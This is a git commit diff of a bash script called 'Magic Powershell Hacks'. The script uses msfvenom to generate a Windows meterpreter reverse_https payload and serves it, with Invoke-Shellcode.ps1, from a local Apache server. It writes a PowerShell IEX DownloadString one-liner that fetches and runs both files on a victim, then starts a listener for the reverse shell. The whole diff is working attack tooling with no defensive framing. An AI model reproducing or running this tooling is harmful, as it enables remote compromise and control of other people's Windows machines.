a6c85982f340f7be25b96119125e44e2511882f8
robonps <62271193+Bob-web-eng@users.noreply.github.com>
2020-06-21 18:34:14 +1200

    Update script.sh

--- script.sh
+++ script.sh
@@ -4,7 +4,7 @@ clear
 echo "   ---------Magic Powershell Hacks---------
 ___________For Windows, Made By Bob____________
 "
-echo -n "Enter Name Of Wireless Card e.g. wlan0 [ENTER]: "
+echo -n "Enter Name Of Wireless Card e.g. eth0 [ENTER]: "
 read wcard
 ip="$(/sbin/ip -o -4 addr list $wcard| awk '{print $4}' | cut -d/ -f1)"
 
@@ -18,15 +18,21 @@ read port
 echo "
 Deleting Old Files Created By This Script"
 rm code.txt
+rm shellcode.txt
 
-echo "Copying Script to /var/www/html "
+echo "Creating Script"
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST="$ip" LPORT="$port" -f powershell > shellcode.txt
+
+echo "Copying Scripts to /var/www/html "
 cp Invoke-Shellcode.ps1 /var/www/html/
+cp shellcode.txt /var/www/html/
 echo "Starting Web Server"
 service apache2 start
 echo "Copied to http://"$ip"/Invoke-Shellcode.ps1"
 echo "Generating Script For Powershell..."
-echo 'IEX(New-Object Net.WebClient).DownloadString ("http://'$ip'/Invoke-Shellcode.ps1")
-./Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost '$ip' -lport '$port' -Force' > code.txt
+echo 'IEX(New-Object Net.WebClient).DownloadString("http://'$ip:80'/Invoke-Shellcode.ps1")
+IEX(New-Object Net.WebClient).DownloadString("http://'$ip:80'/shellcode.txt")
+Invoke-Shellcode -Shellcode ($buf) -Force' > code.txt
 echo "Saved!"
 service postgresql start
 echo "Starting Listener"
